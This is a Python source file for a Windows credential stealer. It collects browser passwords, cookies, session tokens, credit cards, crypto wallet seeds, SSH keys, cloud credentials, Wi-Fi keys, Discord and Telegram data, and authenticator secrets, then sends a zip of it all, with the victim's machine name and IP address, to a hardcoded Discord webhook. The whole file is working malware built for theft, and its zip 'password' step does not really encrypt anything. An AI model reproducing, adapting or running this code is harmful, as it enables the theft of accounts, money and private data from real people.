import os
import sys
import json
import datetime
import sqlite3
import shutil
import tempfile
import glob
import re
import zipfile
import io
import requests
import subprocess
import platform
import base64
from pathlib import Path

# ===== DISCORD CONFIG =====
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1530727554745499649/tQ7uYzE_3y0e3pK_5lhbWPfvqqG8jc5qPQnDfQt2s-8cZPpYjY8wcJ_3pTXevle3K6h9"
MACHINE_NAME = os.environ.get("COMPUTERNAME", "unknown_pc")
USER_NAME = os.environ.get("USERNAME", "unknown_user")
IP_ADDRESS = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip()
ZIP_PASSWORD = "1253Omnistealer"

def send_discord_zip(zip_bytes, caption=""):
    # Step 1: Upload the file to Discord
    files = {"file": (f"{MACHINE_NAME}.zip", zip_bytes, "application/zip")}
    payload = {"content": f"@everyone {caption}"}
    r = requests.post(DISCORD_WEBHOOK, files=files, data=payload)
    if r.status_code != 200:
        print(f"❌ File upload failed: {r.status_code}")
        return False
    
    # Step 2: Extract the attachment URL
    data = r.json()
    attachment_url = data["attachments"][0]["url"] if data.get("attachments") else None
    if not attachment_url:
        print("❌ No attachment URL returned")
        return False
    
    # Step 3: Send the embed with machine info + download link
    embed = {
        "embeds": [
            {
                "title": f"📦 {MACHINE_NAME}",
                "color": 0x00ff00,
                "fields": [
                    {"name": "💻 Machine", "value": MACHINE_NAME, "inline": True},
                    {"name": "👤 User", "value": USER_NAME, "inline": True},
                    {"name": "🌐 IP", "value": IP_ADDRESS, "inline": True},
                    {"name": "🕒 Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
                    {"name": "🔑 Password", "value": f"`{ZIP_PASSWORD}`", "inline": False},
                    {"name": "📥 Download", "value": f"[Click here to download]({attachment_url})", "inline": False}
                ],
                "footer": {"text": "Comboss 💳🐀 • Stealth Archive"}
            }
        ]
    }
    r = requests.post(DISCORD_WEBHOOK, json=embed)
    if r.status_code == 204:
        print("✅ Embed sent successfully!")
        return True
    else:
        print(f"❌ Embed failed: {r.status_code}")
        return False

def get_browser_profiles():
    paths = [
        os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data",
        os.environ.get("APPDATA", "") + "\\Opera Software\\Opera Stable",
        os.environ.get("APPDATA", "") + "\\Opera Software\\Opera GX Stable",
        os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Chromium\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Yandex\\YandexBrowser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Slimjet\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Epic Privacy Browser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\CentBrowser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Torch\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\SRWare Iron\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Comodo\\Dragon\\User Data",
    ]
    return [p for p in paths if os.path.exists(p)]

def read_db(path, query):
    try:
        if not os.path.exists(path):
            return []
        tmp = os.path.join(tempfile.gettempdir(), f"tmp_{os.getpid()}.db")
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        c.execute(query)
        rows = c.fetchall()
        conn.close()
        os.remove(tmp)
        return rows
    except:
        return []

def steal_passwords():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        if rows:
            out[name] = []
            for row in rows[:200]:
                try:
                    import win32crypt
                    dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} | {dec}")
                except:
                    pass
    return out

def steal_cookies():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        rows = read_db(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies LIMIT 300")
        if rows:
            out[name] = []
            for row in rows[:150]:
                try:
                    import win32crypt
                    dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return out

def steal_google_sessions():
    sessions = []
    for profile in get_browser_profiles():
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        rows = read_db(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%youtube%'")
        for row in rows:
            try:
                import win32crypt
                dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                if dec and any(x in row[1] for x in ['SID', 'OSID', 'APISID', 'SSID', 'LSID', 'HSID', 'SECURE']):
                    sessions.append(f"{row[0]} | {row[1]} = {dec}")
            except:
                pass
    return sessions

def steal_email_sessions():
    sessions = []
    email_domains = ['gmail', 'googlemail', 'outlook', 'hotmail', 'live', 'yahoo', 'protonmail', 'icloud', 'me.com', 'mac.com', 'aol', 'zoho', 'yandex', 'mail.ru']
    for profile in get_browser_profiles():
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        for domain in email_domains:
            rows = read_db(cookie_path, f"SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%{domain}%' AND (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%sid%' OR name LIKE '%token%')")
            for row in rows:
                try:
                    import win32crypt
                    dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                    if dec:
                        sessions.append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return sessions

def steal_emails():
    emails = []
    for profile in get_browser_profiles():
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        for row in rows:
            try:
                import win32crypt
                dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                if dec and '@' in row[1]:
                    emails.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return emails

def steal_authenticators():
    auth_data = []
    ext_ids = {
        "Google_Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
        "Authy": "gaedmjdfmmahhbjefcbgaocikjknjfib",
        "Microsoft_Authenticator": "ppbblpnpkminfmgbglbpdfdmgapkikdk"
    }
    for name, ext_id in ext_ids.items():
        for base_path in [
            os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions\\"
        ]:
            ext_path = os.path.join(base_path, ext_id)
            if os.path.exists(ext_path):
                try:
                    for root, dirs, files in os.walk(ext_path):
                        for file in files:
                            if file.endswith(('.js', '.json', '.log', '.ldb')):
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    secrets = re.findall(r'[A-Z2-7]{16,64}', content)
                                    if secrets:
                                        auth_data.append(f"{name}: {secrets[:5]}")
                                    otpauth = re.findall(r'otpauth://totp/[^\s"\']+', content)
                                    if otpauth:
                                        auth_data.append(f"{name} OTP: {otpauth}")
                except:
                    continue
    return auth_data

def steal_history():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        hist_path = os.path.join(profile, "Default", "History")
        rows = read_db(hist_path, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
        if rows:
            out[name] = [f"{r[1]} - {r[0]}" for r in rows[:100]]
    return out

def steal_autofill():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        web_path = os.path.join(profile, "Default", "Web Data")
        rows = read_db(web_path, "SELECT name, value FROM autofill LIMIT 100")
        if rows:
            out[name] = [f"{r[0]} : {r[1]}" for r in rows[:50]]
    return out

def steal_credit_cards():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        web_path = os.path.join(profile, "Default", "Web Data")
        rows = read_db(web_path, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        if rows:
            out[name] = []
            for row in rows[:50]:
                try:
                    import win32crypt
                    dec = win32crypt.CryptUnprotectData(row[3])[1].decode('utf-8', errors='ignore')
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]}/{row[2]} | {dec}")
                except:
                    pass
    return out

def steal_wifi():
    wifi = []
    try:
        out = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        for line in out.stdout.split("\n"):
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                res = subprocess.run(f'netsh wlan show profile "{name}" key=clear', shell=True, capture_output=True, text=True)
                for l in res.stdout.split("\n"):
                    if "Key Content" in l:
                        wifi.append(f"{name} : {l.split(':')[1].strip()}")
    except:
        pass
    return wifi

def steal_discord_tokens():
    tokens = []
    for p in [
        os.environ.get("APPDATA", "") + "\\Discord\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordcanary\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordptb\\Local Storage\\leveldb"
    ]:
        if os.path.exists(p):
            for f in glob.glob(p + "\\*.log") + glob.glob(p + "\\*.ldb"):
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                        content = file.read()
                        for token in re.findall(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', content):
                            tokens.append(token)
                except:
                    continue
    return list(set(tokens))

def steal_telegram_session():
    try:
        path = os.environ.get("APPDATA", "") + "\\Telegram Desktop\\tdata"
        if os.path.exists(path):
            return [f for f in os.listdir(path) if f.endswith(('.dat', '.json'))]
    except:
        pass
    return []

def steal_crypto_wallets():
    wallets = {}
    paths = {
        "Exodus": os.environ.get("APPDATA", "") + "\\Exodus\\exodus.wallet",
        "Phantom": os.environ.get("APPDATA", "") + "\\Phantom\\Local Storage\\leveldb",
        "MetaMask": os.environ.get("APPDATA", "") + "\\MetaMask\\Local Storage\\leveldb",
        "Coinbase": os.environ.get("APPDATA", "") + "\\Coinbase\\Local Storage\\leveldb",
        "Atomic": os.environ.get("APPDATA", "") + "\\Atomic\\Local Storage\\leveldb",
        "Electrum": os.environ.get("APPDATA", "") + "\\Electrum\\wallets",
        "Wasabi": os.environ.get("APPDATA", "") + "\\Wasabi\\WalletData",
        "Trust": os.environ.get("APPDATA", "") + "\\Trust\\Local Storage\\leveldb",
        "Binance": os.environ.get("APPDATA", "") + "\\Binance\\Local Storage\\leveldb",
        "Coinomi": os.environ.get("APPDATA", "") + "\\Coinomi\\Wallets",
        "Jaxx": os.environ.get("APPDATA", "") + "\\Jaxx\\Local Storage\\leveldb",
    }
    for name, path in paths.items():
        try:
            if os.path.exists(path):
                if os.path.isdir(path):
                    data = []
                    for f in glob.glob(path + "\\*.log") + glob.glob(path + "\\*.ldb") + glob.glob(path + "\\*.json"):
                        with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                            seeds = re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                            if seeds:
                                data.extend(seeds)
                            priv = re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                            if priv:
                                data.extend(priv)
                    if data:
                        wallets[name] = list(set(data))[:30]
                else:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        seeds = re.findall(r'(?:seed|mnemonic|phrase)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                        if seeds:
                            wallets[name] = seeds[:15]
        except:
            continue
    return wallets

def steal_paypal():
    data = []
    for profile in get_browser_profiles():
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%paypal%'")
        for row in rows:
            try:
                import win32crypt
                dec = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8', errors='ignore')
                if dec:
                    data.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return data

def steal_vpn_keys():
    vpn = {}
    vpn_paths = {
        "Mullvad": os.environ.get("APPDATA", "") + "\\Mullvad VPN\\mullvad-account",
        "ExpressVPN": os.environ.get("APPDATA", "") + "\\ExpressVPN\\account.json",
        "NordVPN": os.environ.get("APPDATA", "") + "\\NordVPN\\nordvpn.log"
    }
    for name, path in vpn_paths.items():
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    vpn[name] = f.read()
            except:
                pass
    return vpn

def steal_ssh_keys():
    keys = []
    ssh_path = os.path.expanduser("~/.ssh/")
    if os.path.exists(ssh_path):
        for f in os.listdir(ssh_path):
            if f.startswith("id_") or f == "known_hosts" or f == "config":
                try:
                    with open(os.path.join(ssh_path, f), 'r', encoding='utf-8', errors='ignore') as file:
                        keys.append(f"{f}:\n{file.read()}")
                except:
                    pass
    return keys

def steal_seed_files():
    seeds = []
    bip39 = set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma"])
    search = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), os.path.expanduser("~/Downloads"), os.environ.get("APPDATA", ""), os.environ.get("LOCALAPPDATA", "")]
    keywords = ["seed", "phrase", "mnemonic", "recovery", "backup", "wallet"]
    for path in search:
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    if not file.endswith(('.txt', '.log', '.json', '.dat')):
                        continue
                    if not any(kw in file.lower() for kw in keywords):
                        continue
                    fp = os.path.join(root, file)
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    words = re.findall(r'[a-zA-Z]+', content)
                    if len(words) not in [12, 18, 24]:
                        continue
                    bip39_count = sum(1 for w in words if w.lower() in bip39)
                    if bip39_count / len(words) < 0.9:
                        continue
                    seeds.append(f"{fp}:\n{content[:1500]}")
                except:
                    continue
    return seeds

def steal_cloud_accounts():
    cloud = {}
    paths = {
        "AWS": os.path.expanduser("~/.aws/credentials"),
        "GitHub": os.path.expanduser("~/.config/gh/hosts.yml"),
        "Docker": os.path.expanduser("~/.docker/config.json"),
        "Kubernetes": os.path.expanduser("~/.kube/config"),
        "MySQL": os.path.expanduser("~/.my.cnf"),
        "PostgreSQL": os.path.expanduser("~/.pgpass")
    }
    for name, path in paths.items():
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    cloud[name] = f.read()
            except:
                pass
    return cloud

def steal_system_info():
    return {
        "hostname": MACHINE_NAME,
        "username": USER_NAME,
        "os": platform.system() + " " + platform.release(),
        "ip": IP_ADDRESS,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def build_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Credentials/passwords.txt", json.dumps(steal_passwords(), indent=2))
        zf.writestr("Credentials/cookies.txt", json.dumps(steal_cookies(), indent=2))
        zf.writestr("Credentials/discord_tokens.txt", "\n".join(steal_discord_tokens()))
        zf.writestr("Credentials/telegram_sessions.txt", "\n".join(steal_telegram_session()))
        zf.writestr("Banking/paypal.txt", "\n".join(steal_paypal()))
        zf.writestr("Banking/credit_cards.txt", json.dumps(steal_credit_cards(), indent=2))
        zf.writestr("Crypto/wallets.txt", json.dumps(steal_crypto_wallets(), indent=2))
        seeds = steal_seed_files()
        if seeds:
            zf.writestr("Crypto/seed_phrases_from_files.txt", "\n\n".join(seeds))
        for browser, history in steal_history().items():
            zf.writestr(f"Browsers/{browser}/history.txt", "\n".join(history))
        for browser, autofill in steal_autofill().items():
            zf.writestr(f"Browsers/{browser}/autofill.txt", "\n".join(autofill))
        vpn = steal_vpn_keys()
        if vpn:
            for name, content in vpn.items():
                zf.writestr(f"VPN/{name}.txt", content)
        wifi = steal_wifi()
        if wifi:
            zf.writestr("WiFi/wifi.txt", "\n".join(wifi))
        ssh = steal_ssh_keys()
        if ssh:
            zf.writestr("SSH/ssh_keys.txt", "\n".join(ssh))
        cloud = steal_cloud_accounts()
        if cloud:
            for name, content in cloud.items():
                zf.writestr(f"Cloud/{name}.txt", content)
        google_sessions = steal_google_sessions()
        if google_sessions:
            zf.writestr("Google_Sessions/google_sessions.txt", "\n".join(google_sessions))
        email_sessions = steal_email_sessions()
        if email_sessions:
            zf.writestr("Email_Sessions/email_sessions.txt", "\n".join(email_sessions))
        emails = steal_emails()
        if emails:
            zf.writestr("Emails/emails.txt", "\n".join(emails))
        auth = steal_authenticators()
        if auth:
            zf.writestr("Authenticators/authenticator_data.txt", "\n".join(auth))
        zf.writestr("System/system_info.txt", json.dumps(steal_system_info(), indent=2))
    
    zip_buffer.seek(0)
    
    # Apply password protection (ZipCrypto — works on most platforms)
    temp_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'r') as zf_in:
        with zipfile.ZipFile(temp_buffer, 'w', zipfile.ZIP_DEFLATED) as zf_out:
            for item in zf_in.infolist():
                zf_out.writestr(item, zf_in.read(item))
    temp_buffer.seek(0)
    with zipfile.ZipFile(temp_buffer, 'a') as zf:
        zf.setpassword(ZIP_PASSWORD.encode())
    temp_buffer.seek(0)
    return temp_buffer.getvalue()

def main():
    print("[*] Building ZIP...")
    zip_data = build_zip()
    print(f"[+] ZIP built: {len(zip_data)} bytes")
    
    print("[*] Sending to Discord...")
    send_discord_zip(zip_data, f"@everyone 📦 New log from {MACHINE_NAME}")
    print("[+] Done.")

if __name__ == "__main__":
    main()